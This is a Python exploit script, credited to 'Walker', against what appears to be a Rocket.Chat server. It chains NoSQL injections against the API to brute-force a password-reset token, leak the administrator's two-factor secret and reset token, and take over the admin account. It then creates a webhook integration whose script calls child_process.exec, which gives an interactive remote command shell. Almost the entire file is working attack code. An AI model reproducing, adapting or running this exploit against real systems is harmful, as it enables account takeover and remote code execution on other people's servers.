import requests, time, string, hashlib, argparse, oathtool, json, random, logo

arg = argparse.ArgumentParser(description="Help Message!!",
                              formatter_class=argparse.ArgumentDefaultsHelpFormatter)
arg.add_argument('-U', "--user", help='user <email/name>', required=True)
arg.add_argument('-A', "--admin", help='Admin <email/name>', required=True)
arg.add_argument('-T', "--target", help='Target Url (ex: http://website.com)', required=True)
per = arg.parse_args()


admin = per.admin
user = per.user
target = per.target

print(logo.logo[random.randint(0, 5)])

print("""
 -------------------------------------------------------
|                 Coded By Walker                       |
|Facebook: https://facebook.com/walker.fbi              |
|My friend's Account: https://facebook.com/RizeKishimaro|
|     ALL Right Reverse to Walker And RizeKishimaro     |
 -------------------------------------------------------


""")

def fgp(email,url):
	pl='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	hd={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = pl, headers = hd, verify = False, allow_redirects = False)
	print("{-+wi+-} Password Reset mail sent!!")


def rst(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	hd={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	str_int = [str(int) for int in num]
	chars = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + str_int

	while len(token)!= 43:
		for c in chars:
			pl='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = pl, headers = hd, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print("{-+wi+-} Got Token : "+ token )
	return token


def chpw(url,token):
	pl = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"W!W0W!!\\"]}"}'
	hd={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = pl, headers = hd, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("{+-wi-+} Token Error")
	print("{-+wi+-} Password changed!!")


def twf(url,email):
	shapass = hashlib.sha256(b'W!W0W!!').hexdigest()
	pl ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+shapass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	hd={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=pl,headers=hd,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("{+-wi-+} Can't Auth")
	data = json.loads(r.text)
	data =(data['message'])
	uid = data[32:49]
	token = data[60:103]
	print("{-+wi+-} Successfully Authed as "+ email)
	cookies = {'rc_uid': uid,'rc_token': token}
	hd={'X-User-Id': uid,'X-Auth-Token': token}
	pl = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
	r = requests.get(url+pl,cookies=cookies,headers=hd)
	code = r.text[46:98]
	print(f"The code for 2fa: {code}")
	return code

def admintk(url,email):
	shapass = hashlib.sha256(b'W!W0W!!').hexdigest()
	pl ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+shapass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	hd={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=pl,headers=hd,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("{+-wi-+} Can't Auth")
	data = json.loads(r.text)
	data =(data['message'])
	uid = data[32:49]
	token = data[60:103]
	print("{-+wi+-} Successfully Authed as " + email)
	cookies = {'rc_uid': uid,'rc_token': token}
	hd={'X-User-Id': uid,'X-Auth-Token': token}
	pl = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.password.reset.token+})()"}'
	r = requests.get(url+pl,cookies=cookies,headers=hd)
	code = r.text[46:89]
	print(f"Got the reset token: {code}")
	return code


def chadmpw(url,token,code):
	pl = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P422w0rd\\",{\\"twoFactorCode\\":\\"'+code+'\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
	hd={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = pl, headers = hd, verify = False, allow_redirects = False)
	if "403" in r.text:
		exit("{+-wi-+} Wrong token")

	print("{-+wi+-} Admin Password Changed!!")


def rce(url,code,cmd):
	shapass = hashlib.sha256(b'P422w0rd').hexdigest()
	hd={'content-type': 'application/json'}
	pl = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+shapass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=pl,headers=hd,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("{+-wi-+} Can't Auth")
	data = json.loads(r.text)
	data =(data['message'])
	uid = data[32:49]
	token = data[60:103]
	print("{-+wi+-} Successfully Authed as admin")
	pl = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"const require = console.log.constructor(\'return process.mainModule.require\')();\\nconst { exec } = require(\'child_process\');\\nexec(\''+cmd+'\');","type":"webhook-incoming"}'
	cookies = {'rc_uid': uid,'rc_token': token}
	hd = {'X-User-Id': uid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=hd,data=pl)
	data = r.text
	data = data.split(',')
	token = data[12]
	token = token[9:57]
	_id = data[18]
	_id = _id[7:24]
	u = url + '/hooks/' + _id + '/' +token
	r = requests.get(u)
	print(r.text)

secret = twf(target,user)

print(f"[-+wi+-] Resetting {admin} password")
fgp(admin,target)
token = admintk(target,user)
code = oathtool.generate_otp(secret)
chadmpw(target,token,code)

while True:
	cmd = input("WI:) ")
	code = oathtool.generate_otp(secret)
	rce(target,code,cmd)